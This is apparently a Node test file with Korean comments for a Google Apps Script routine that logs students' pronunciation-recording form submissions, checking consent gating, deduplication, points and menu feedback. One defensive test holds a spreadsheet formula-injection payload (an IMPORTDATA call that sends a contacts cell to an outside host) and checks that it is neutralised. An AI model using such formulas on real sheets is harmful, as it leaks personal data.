'use strict';
/**
 * 🎙 발음 수집 통관 — **폼 응답 한 줄이 `voice_log` 18칸으로 실제로 앉는가**
 *
 * ■ 왜 이 시험이 필요한가 (유호 09-03 「a,b,c 전부 다 하자」 ⓐ)
 *   `voiceSweep_` 를 이름으로 부르는 시험은 이미 다섯 파일에 있다. 그런데 **전부 «소스 문자열»만 본다** —
 *   `sweep.includes('voiceConsentMap_')`(발화퀄리티:349) 처럼 「그 낱말이 코드에 적혀 있나」까지다.
 *   그래서 다음 셋이 **동시에 참**일 수 있었다: ①코드에 동의 게이트가 적혀 있다 ②그 게이트가 실제로는
 *   아무도 안 막는다 ③시험은 초록이다. 함수를 **실제로 태워 본 검사는 이 파일이 처음**이다.
 *
 *   그리고 이 통로는 **개원일 학생 소리가 들어올 때 처음 도는 코드**다. 라이브에서 지금까지 돈 것은
 *   `setupVoiceMissions`(목록 세우기) 1회뿐이고 스윕은 0회 — v9.277 이 세운 발음 6칸이 «채워지는 것»을
 *   아직 아무도 못 봤다. 그날 안 돌면 그날 소리는 **소급이 안 된다**(규격 §「소급 불가는 무엇을
 *   말하게 했느냐」). 그래서 과녁은 「코드에 있나」가 아니라 **「돌리면 칸이 차나」**다.
 *
 * ■ 이 시험이 틀릴 때의 모습 (대가를 함께 적는다)
 *   시트는 `시트흉내`(계약 6조항)이지 라이브 Sheets 가 아니다 — 그 계약이 라이브와 갈리면 여기 전부가
 *   **같은 방향으로** 틀린다(흉내 파일 머리말의 그 대가 그대로). 그리고 Drive·폼·메일은 가짜라
 *   **「라이브에서 실제로 돈다」는 이 파일로 증명되지 않는다** — 그건 유호님이 메뉴를 누르는 날 선다.
 *   여기서 닫는 것은 그 앞의 것 하나뿐이다: **「돌기만 하면 값이 옳게 앉는다」.**
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const { engineSource } = require('./_engine-source');
const { 시트흉내 } = require('./lib/시트흉내.js');

const ROOT = path.join(__dirname, '..');
const 교재 = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
const 코드 = fs.readFileSync(path.join(ROOT, 'Code.js'), 'utf8');
const 엔진 = engineSource();

/* 정본 값은 전부 소스에서 뽑는다 — 손으로 베끼면 정본이 바뀔 때 시험이 «엉뚱한 것을 재기 시작»한다
 * (빨개지는 게 아니라 조용히 낡는다). [[constant-known-in-two-places]] */
const VOICE_LOG_HEADERS = JSON.parse(엔진.match(/const VOICE_LOG_HEADERS = (\[[^\]]*\]);/)[1].replace(/'/g, '"'));
const SCHEMA_VER = (엔진.match(/const SCHEMA_VER = '([^']+)'/) || [])[1];
const TB_VOICE_POINTS = Number(교재.match(/const TB_VOICE_POINTS = (\d+);/)[1]);
const TB_VOICE_REASON = 교재.match(/const TB_VOICE_REASON = '([^']+)'/)[1];

/** 소스에서 함수 하나를 «진짜로» 꺼낸다 — 스텁으로 대신하면 시험이 내 상상을 잰다. */
function 꺼내기(소스, 머리, 이름, 의존) {
  const s = 소스.indexOf(머리);
  assert.notEqual(s, -1, `소스에서 ${머리} 를 못 찾았다 — 함수가 개명됐거나 사라졌다`);
  const e = 소스.indexOf('\nfunction ', s + 머리.length);
  const n = Object.keys(의존 || {});
  return new Function(...n, `${소스.slice(s, e === -1 ? undefined : e)}\nreturn ${이름};`)(...n.map((k) => 의존[k]));
}

/* GAS 전역 하나 — `dstr` 과 `voiceSweep_` 이 **같은 것**을 써야 멱등 키가 안 갈린다. */
const 가짜Utilities = {
  formatDate: (d, _tz, f) => {
    const p = (n) => String(n).padStart(2, '0');
    const y = d.getFullYear(), m = p(d.getMonth() + 1), day = p(d.getDate());
    if (f === 'yyyyMMdd') return `${y}${m}${day}`;
    if (f === 'yyyy-MM') return `${y}-${m}`;
    return `${y}-${m}-${day}`;
  }
};

/* `dstr`·`행소독_`·`셀안전_` 은 엔진 정본을 쓴다 — 멱등 키와 소독은 이 통로의 «판정»이라
 * 시험이 손짐작으로 흉내 내면 그 둘을 잰 게 아니다.
 * ⚠ `셀안전_` 은 Code.js 가 아니라 `상담AI.js` 에 산다(GAS 는 전역을 공유한다). */
const 상담 = fs.readFileSync(path.join(ROOT, '상담AI.js'), 'utf8');
const 셀안전_ = 꺼내기(상담, 'function 셀안전_(', '셀안전_', {});
const dstr = 꺼내기(코드, 'function dstr(', 'dstr', { Utilities: 가짜Utilities });
const 행소독_ = 꺼내기(코드, 'function 행소독_(', '행소독_', { 셀안전_ });

const 폼머리 = ['타임스탬프', '학생ID', '미션ID', '미션', '녹음 파일'];

/**
 * `voiceSweep_` 를 가짜 의존으로 **실제로 태운다**.
 * @returns {{voice:Array, point:Array, 포인터:string, 메일:Array, 버린sid:Array}}
 */
function 스윕(opt) {
  const o = opt || {};
  const 폼행들 = o.폼행들 || [];
  const src = 시트흉내({ 첫행: 1, 행들: [폼머리.slice()].concat(폼행들) });
  const vl = 시트흉내({ 첫행: 1, 행들: [VOICE_LOG_HEADERS.slice()] });
  const pl = 시트흉내({ 첫행: 1, 행들: [['id', 'student_id', 'points', 'reason', 'given_by', 'created_at', 'month', '태그'].concat(o.기존포인트 ? [] : [])] });
  (o.기존포인트 || []).forEach((r) => pl.data.push(r.slice()));

  const pf = 시트흉내({
    첫행: 1,
    행들: [['student_id', '이름', '반', '역할'].concat(new Array(63).fill(''))].concat(
      (o.명부 || [['SYNK-001', '바트', 'A', 'student']]).map((r) => {
        const row = new Array(67).fill('');
        row[0] = r[0]; row[1] = r[1] || ''; row[3] = r[3] || 'student'; row[66] = r[4] === undefined ? 2 : r[4];
        return row;
      })
    )
  });

  const 시트 = { profiles: pf, 목소리폼_응답: src, voice_log: vl, point_logs: pl };
  const ss = {
    getSheetByName: (n) => 시트[n] || null,
    getSpreadsheetTimeZone: () => 'Asia/Seoul'
  };

  const 저장소 = { 목소리폼_포인터: o.포인터 === undefined ? undefined : String(o.포인터) };
  const 메일 = [];
  const 버린sid = [];

  const 의존 = {
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (저장소[k] === undefined ? null : 저장소[k]),
        setProperty: (k, v) => { 저장소[k] = String(v); }
      })
    },
    ensureSheet: (_ss, name) => 시트[name],
    헤더보정_: () => {},
    VOICE_LOG_HEADERS,
    SCHEMA_VER,
    TB_VOICE_POINTS,
    TB_VOICE_REASON,
    /* `voiceSweep_` 는 `typeof … === 'function'` 으로 존재를 묻는다 — 인자로 넘기면 그 검사를 지난다.
     * `동의맵: null` 을 주면 「시트·열 접근 실패」를 그대로 재현한다(전원 보류가 과녁인 검사에서 쓴다). */
    voiceConsentMap_: () => (o.동의맵 === undefined ? { 'SYNK-001': 'yes' } : o.동의맵),
    seasonLabelOf_: () => (o.시즌 === undefined ? '2027-1' : o.시즌),
    voiceMissionTexts_: () => o.목표문 || {},
    행소독_,
    dstr,
    notifyDroppedSids_: (_label, sids) => { (sids || []).forEach((s) => 버린sid.push(s)); },
    adminMail: (제목, 본문) => { 메일.push({ 제목, 본문 }); },
    Utilities: 가짜Utilities,
    Logger: { log: () => {} }
  };

  꺼내기(교재, 'function voiceSweep_(', 'voiceSweep_', 의존)(ss);

  return {
    voice: vl.data.slice(1).filter((r) => (r || []).some((v) => v !== '' && v != null)),
    point: pl.data.slice(1).filter((r) => (r || []).some((v) => v !== '' && v != null)),
    포인터: 저장소.목소리폼_포인터,
    메일, 버린sid, vl, pl
  };
}

const 어제 = new Date(Date.now() - 86400000);
const 한줄 = (o) => [(o && o.ts) || 어제, (o && o.sid) === undefined ? 'SYNK-001' : o.sid,
  (o && o.mid) || 'HW306', (o && o.mission) || '연음 연습', (o && o.file) === undefined ? 'https://drive.google.com/file/d/FILE123/view' : o.file];

// ── 핵심 셋 — 이 셋이 「돌기만 하면 값이 옳게 앉는다」의 본체 ─────────────────

test('🔴 적재된 행의 폭이 헤더 18칸과 같다 — v9.277 발음 6칸이 «실제로» 실린다', () => {
  const r = 스윕({ 폼행들: [한줄()] });
  assert.equal(r.voice.length, 1, '동의한 학생의 제출이 voice_log 에 안 앉았다');
  /* 과녁: 「칸을 늘렸다」는 헤더 상수만 바꿔도 참이 된다. 실제 쓰기가 옛 폭이면 뒤 6칸은
   * 영원히 빈 채 쌓이고, 그 소리는 나중에 못 쓴다(규격 §3). 그래서 헤더가 아니라 «쓴 행»을 잰다. */
  assert.equal(r.vl.raw[0].length, VOICE_LOG_HEADERS.length,
    `setValues 에 건넨 행의 폭이 ${r.vl.raw[0].length} — 헤더는 ${VOICE_LOG_HEADERS.length} 칸이다`);
});

test('🔴 음성 동의가 「yes」가 아니면 적재도 포인트도 0 — 게이트가 «막는지»를 돌려서 잰다', () => {
  ['no', '', '몰라'].forEach((상태) => {
    const r = 스윕({ 폼행들: [한줄()], 동의맵: { 'SYNK-001': 상태 } });
    assert.equal(r.voice.length, 0, `동의 상태 '${상태}' 인데 voice_log 에 쌓였다 — 미성년 목소리가 게이트를 지났다`);
    assert.equal(r.point.length, 0, `동의 상태 '${상태}' 인데 포인트가 나갔다`);
  });
  const 보류 = 스윕({ 폼행들: [한줄()], 동의맵: { 'SYNK-001': 'no' } });
  assert.ok(보류.메일.some((m) => m.제목.includes('보류')),
    '보류를 원장에게 안 알린다 — 학생 쪽에서 「왜 반영이 안 되지」가 미스터리가 된다');
});

test('🔴 동의맵을 못 읽으면(null) 전원 보류 — 판정 불가가 «통과»로 뒤집히지 않는다', () => {
  const r = 스윕({ 폼행들: [한줄(), 한줄({ sid: 'SYNK-001' })], 동의맵: null });
  assert.equal(r.voice.length, 0, '동의 확인 불가인데 적재됐다 — 게이트가 침묵으로 열렸다');
  assert.equal(r.point.length, 0, '동의 확인 불가인데 포인트가 나갔다');
});

// ── 소급 불가 칸들 — 그날 안 박으면 나중에 못 만든다 ──────────────────────

test('🔴 목표발화는 낱말 «전량»을 이어 담는다 — 여섯을 지정하면 다섯이 사라지던 자리(심문 P0-②)', () => {
  const 낱말 = ['먹었어요', '읽었어요', '들었어요', '놀았어요', '많았어요', '씻었어요'];
  const r = 스윕({ 폼행들: [한줄({ mid: 'HW306' })], 목표문: { HW306: 낱말 } });
  const 칸 = r.voice[0][VOICE_LOG_HEADERS.indexOf('목표발화')];
  낱말.forEach((w) => assert.ok(String(칸).includes(w), `목표발화에 「${w}」 가 없다 — 낱말이 조용히 사라졌다`));
});

test('목표발화 목록이 아직 없으면 «빈 칸»이지 실패가 아니다 — 그건 결함이 아니라 아직 안 쓴 것', () => {
  const r = 스윕({ 폼행들: [한줄()], 목표문: {} });
  assert.equal(r.voice.length, 1, '목록이 비었다고 제출을 버렸다 — 그 소리가 통째로 사라진다');
  assert.equal(r.voice[0][VOICE_LOG_HEADERS.indexOf('목표발화')], '', '목록이 없는데 목표발화가 채워졌다 — 어디서 왔나');
});

test('시즌·급수·schema_ver 가 제출 «시점»의 값으로 박힌다 — 나중에 유도할 수 없는 셋', () => {
  const r = 스윕({ 폼행들: [한줄()], 시즌: '2027-2', 명부: [['SYNK-001', '바트', 'A', 'student', 3]] });
  const v = r.voice[0];
  assert.equal(v[VOICE_LOG_HEADERS.indexOf('시즌')], '2027-2', '시즌이 안 박혔다 — Ⅰ-8 눈금의 전제가 빈다');
  assert.equal(v[VOICE_LOG_HEADERS.indexOf('급수')], 3, '급수 스냅샷이 안 박혔다');
  assert.equal(v[VOICE_LOG_HEADERS.indexOf('schema_ver')], SCHEMA_VER, '행이 자기 규격을 안 들고 있다(A-8)');
});

// ── 조용한 오적재 — 오류 없이 값만 틀리는 계열 ───────────────────────────

test('「미션ID」와 「미션」이 안 섞인다 — 부분문자열이라 순서를 안 가르면 ID 가 자유문 칸에 실린다', () => {
  const r = 스윕({ 폼행들: [한줄({ mid: 'HW311', mission: '비음화 연습' })] });
  const v = r.voice[0];
  assert.equal(v[VOICE_LOG_HEADERS.indexOf('미션ID')], 'HW311', '미션ID 칸에 ID 가 안 들어갔다');
  assert.equal(v[VOICE_LOG_HEADERS.indexOf('미션')], '비음화 연습', '미션 칸에 자유문이 안 들어갔다');
});

test('명부에 없는 학생ID 는 버리고 원장에게 알린다 — 조용히 삼키지 않는다', () => {
  const r = 스윕({ 폼행들: [한줄({ sid: 'SYNK-999' })] });
  assert.equal(r.voice.length, 0, '명부에 없는 ID 가 적재됐다');
  assert.ok(r.버린sid.includes('SYNK-999'), '버린 ID 를 통보하지 않았다 — 학생은 냈는데 아무도 모른다');
});

test('포인터가 전진하고, 재실행이 같은 행을 다시 쌓지 않는다', () => {
  const 폼행들 = [한줄()];
  const 첫런 = 스윕({ 폼행들 });
  assert.equal(첫런.voice.length, 1);
  assert.equal(Number(첫런.포인터), 2, '포인터가 마지막 행으로 안 갔다 — 다음 밤에 같은 줄을 또 읽는다');
  const 둘째런 = 스윕({ 폼행들, 포인터: 첫런.포인터 });
  assert.equal(둘째런.voice.length, 0, '포인터를 들고 다시 돌렸는데 또 쌓였다 — 밤마다 중복이 자란다');
});

test('같은 날 여러 번 제출해도 기록은 전부, 포인트는 하루 1회', () => {
  const 오늘 = new Date();
  const r = 스윕({ 폼행들: [한줄({ ts: 오늘, file: 'https://drive.google.com/file/d/A1/view' }),
    한줄({ ts: 오늘, file: 'https://drive.google.com/file/d/A2/view' })] });
  assert.equal(r.voice.length, 2, '두 번째 제출의 «기록»까지 버렸다 — 연습을 벌하는 모양이 된다');
  assert.equal(r.point.length, 1, '같은 날 포인트가 두 번 나갔다');
  assert.equal(r.point[0][2], TB_VOICE_POINTS, '포인트 값이 정본과 다르다');
});

test('녹음 파일이 없는 응답은 적재하지 않는다 — 빈 껍데기 행이 분모를 부풀린다', () => {
  const r = 스윕({ 폼행들: [한줄({ file: '' })] });
  assert.equal(r.voice.length, 0, '파일 없는 제출이 voice_log 에 앉았다');
});

// ── 실행 통로(메뉴 버튼) — 「돌았나」를 눈으로 재는 자리 ───────────────────
/* 위 검사들이 「돌리면 값이 옳게 앉는다」를 닫았다면, 여기는 그 앞칸이다 —
 * **유호님이 누를 자리가 있고, 눌렀을 때 «무슨 일이 났는지» 말해 주는가.**
 * 🔑 이 통로에서 0건은 성공의 얼굴을 하고 있다(폼 미연결·새 제출 없음·동의 미확인이 전부
 *    조용히 0을 낸다). 그래서 과녁은 「0이냐」가 아니라 **「0인 «까닭»을 말하느냐」**다. */

const 셋업 = fs.readFileSync(path.join(ROOT, '엔진_셋업확장.js'), 'utf8');

/** `voiceSweepNow_` 를 태운다 — `voiceSweep_` 는 «가짜»다(여기 과녁은 걷기가 아니라 «보고»다). */
function 지금걷기(opt) {
  const o = opt || {};
  const 시트 = {};
  if (o.폼없음 !== true) {
    시트.목소리폼_응답 = 시트흉내({ 첫행: 1, 행들: [폼머리.slice()].concat(new Array(o.제출 === undefined ? 1 : o.제출).fill(0).map(() => 한줄())) });
  }
  const vl = 시트흉내({ 첫행: 1, 행들: [VOICE_LOG_HEADERS.slice()].concat((o.기존voice || []).map(() => VOICE_LOG_HEADERS.map(() => 'x'))) });
  시트.voice_log = vl;

  const ss = { getSheetByName: (n) => 시트[n] || null, getSpreadsheetTimeZone: () => 'Asia/Seoul' };
  let 스위프호출 = 0;
  return {
    글: 꺼내기(교재, 'function voiceSweepNow_(', 'voiceSweepNow_', {
      SpreadsheetApp: { getActiveSpreadsheet: () => ss },
      SYNK_VERSION: 'vTEST',
      PropertiesService: {
        getScriptProperties: () => ({ getProperty: () => (o.포인터 === undefined ? null : String(o.포인터)) })
      },
      /* 가짜 스위프 — 「몇 건 앉히는가」를 시험이 쥔다. 그래야 각 갈래를 다 볼 수 있다. */
      voiceSweep_: () => {
        스위프호출 += 1;
        for (let i = 0; i < (o.앉힘 || 0); i++) vl.data.push(VOICE_LOG_HEADERS.map(() => 'y'));
      },
      isRehearsal_: () => o.리허설 === true
    })(),
    get 스위프호출() { return 스위프호출; }
  };
}

test('폼 탭이 없으면 스위프를 «안 부르고» 무엇을 하실지 알려준다', () => {
  const r = 지금걷기({ 폼없음: true });
  assert.equal(r.스위프호출, 0, '탭이 없는데 스위프를 불렀다 — 엉뚱한 예외가 사용자에게 뜬다');
  assert.ok(r.글.includes('목소리폼_응답'), '어느 탭이 없는지 안 말한다');
  assert.ok(/스프레드시트|연결/.test(r.글), '무엇을 하시면 되는지 안 알려준다 — 「없다」만 말하는 화면은 막다른 길이다');
});

test('앉으면 «몇 건»인지 말한다 — 「오류 없음」과 「걷었음」은 다른 말이다', () => {
  const r = 지금걷기({ 제출: 3, 포인터: 1, 앉힘: 2 });
  assert.equal(r.스위프호출, 1);
  assert.ok(r.글.includes('+2'), `늘어난 수를 안 말한다 — 화면: ${r.글.slice(0, 120)}`);
  assert.ok(r.글.includes('✅'), '성공을 성공이라고 안 말한다');
});

test('새 제출이 0이면 «없다»고 말한다 — 실패로 읽히면 안 된다', () => {
  const r = 지금걷기({ 제출: 2, 포인터: 3, 앉힘: 0 });
  assert.ok(r.글.includes('새 제출이 없습니다'), '새 제출 0을 결함처럼 보이게 두면 안 된다');
  assert.ok(!r.글.includes('⚠'), '정상 상태에 경고를 띄운다 — 늑대소년이 된다');
});

test('🔴 새 제출이 있는데 0건 앉으면 «원인 셋»을 지목한다 — 0이 성공 얼굴을 하는 자리', () => {
  const r = 지금걷기({ 제출: 2, 포인터: 1, 앉힘: 0 });
  assert.ok(r.글.includes('⚠'), '새 제출을 봤는데 하나도 안 앉은 것을 조용히 넘긴다');
  ['음성 동의', 'profiles', '녹음 파일'].forEach((원인) =>
    assert.ok(r.글.includes(원인), `원인 후보 「${원인}」 를 안 짚는다 — 유호님이 어디를 볼지 모른다`));
});

test('리허설 중이면 «메일이 안 나갔다»고 밝힌다 — 안 밝히면 안 온 메일을 기다리신다', () => {
  const r = 지금걷기({ 제출: 2, 포인터: 1, 앉힘: 0, 리허설: true });
  assert.ok(r.글.includes('리허설'), '리허설 상태를 안 알린다');
});

test('🔴 메뉴에 등재돼 있고 그 이름의 함수가 실재한다 — 죽은 이름이면 클릭이 그냥 죽는다', () => {
  const m = 셋업.match(/addItem\('[^']*목소리 지금 걷어오기[^']*',\s*'([A-Za-z_]+)'\)/);
  assert.ok(m, '메뉴에 「목소리 지금 걷어오기」 항목이 없다 — 유호님이 누를 자리가 없다');
  assert.ok(셋업.includes('function ' + m[1] + '('), `메뉴가 부르는 ${m[1]} 이 없다 — 누르면 실패한다`);
  assert.ok(셋업.includes(m[1] + '() { menuRun_('), `${m[1]} 이 menuRun_ 를 안 쓴다 — 결과가 화면에 안 뜬다`);
  assert.ok(교재.includes('function voiceSweepNow_('), '메뉴가 부르는 본체가 교재연동.js 에 없다');
});

test('🛡 미션 칸의 수식이 소독된다 — 같은 스프레드시트에 profiles(연락처)가 산다', () => {
  const r = 스윕({ 폼행들: [한줄({ mission: '=IMPORTDATA("http://x?d="&profiles!H2)' })] });
  assert.equal(r.voice.length, 1);
  /* 🔑 **저장된 값이 아니라 `setValues` 에 «건넨» 원본(raw)을 본다.** 소독은 접두 `'` 를 붙이는데
   *   시트는 그 아포스트로피를 «먹고» 원문을 돌려준다(흉내 계약 ⑤ = 실물 동작). 그래서 저장 후 값은
   *   여전히 `=` 로 시작해 보이고 — 하지만 그건 「텍스트로 굳었다」는 뜻이지 수식이 아니다.
   *   ⚠ 이 자리를 저장값으로 재면 **소독이 멀쩡한데 시험만 빨개진다**(흉내가 라이브보다 사나운 쪽 · F460).
   *   실제로 이 시험을 처음 쓸 때 그렇게 틀렸다 — 같은 실수를 다음 사람이 반복하지 않게 여기 적는다. */
  const 건넨미션 = r.vl.raw[0][VOICE_LOG_HEADERS.indexOf('미션')];
  assert.equal(String(건넨미션)[0], "'",
    `소독을 안 거친 채 시트에 건넸다(${String(건넨미션).slice(0, 14)}…) — 시트가 스스로 평가해 연락처가 밖으로 나간다`);
});
